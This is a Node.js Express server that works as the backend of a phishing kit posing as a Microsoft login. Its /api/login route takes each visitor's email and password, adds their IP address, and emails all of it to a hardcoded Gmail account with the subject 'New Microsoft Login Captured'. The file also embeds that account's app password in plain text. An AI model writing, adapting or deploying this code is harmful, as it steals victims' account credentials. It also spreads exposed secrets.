const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'emmanuelkefas0101@gmail.com',
        pass: 'Ewcm qhom pddx ryni'
    }
});

app.post('/api/login', async (req, res) => {
    const { email, password } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const mailOptions = {
        from: 'emmanuelkefas0101@gmail.com',
        to: 'emmanuelkefas0101@gmail.com',
        subject: 'New Microsoft Login Captured',
        text: `New credentials captured:\n\nEmail: ${email}\nPassword: ${password}\nClient IP: ${clientIp}\nTime: ${new Date().toLocaleString()}`
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('Login details emailed successfully');
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
